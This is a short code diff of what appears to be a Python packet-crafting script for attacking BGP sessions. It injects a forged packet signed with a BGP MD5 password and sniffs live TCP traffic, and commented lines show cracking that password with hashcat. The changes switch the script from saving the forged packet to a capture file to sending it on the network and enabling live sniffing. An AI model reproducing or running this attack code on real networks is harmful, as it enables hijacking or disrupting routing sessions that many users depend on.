@@ -80,13 +80,13 @@ def inject_malicious_packet(seq_num, ack_num, source_port):
     packet.display()
     signed_packet = sign_single_packet(packet, BGP_password)
     #recompute packet to compute checksums
-    #signed_packet = signed_packet.__class__(bytes(signed_packet))
+    signed_packet = signed_packet.__class__(bytes(signed_packet))
     #signed_packet.show()
     signed_packet.display()
-    wrpcap('update_example_crafted .pcap', signed_packet)
+    #wrpcap('update_example_crafted .pcap', signed_packet)
     print("MALICOUS PACKET CRAFTED")
-    #send(signed_packet)
-    #signed_packet.show()
+    send(signed_packet)
+    signed_packet.show()
     #print("Attack done, exiting")
     exit()
 
@@ -139,7 +139,7 @@ def main(argv):
     inject_malicious_packet(seq_num=1, ack_num=1, source_port=19108)
     #BGP_password = break_password(packet_to_break, hashcat_mask)
     #print("[*] Password broken: " + BGP_password)
-    #sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)
+    sniff(prn=lambda p : packet_callback(p), filter="tcp", iface=INTERFACE)
 
 
 
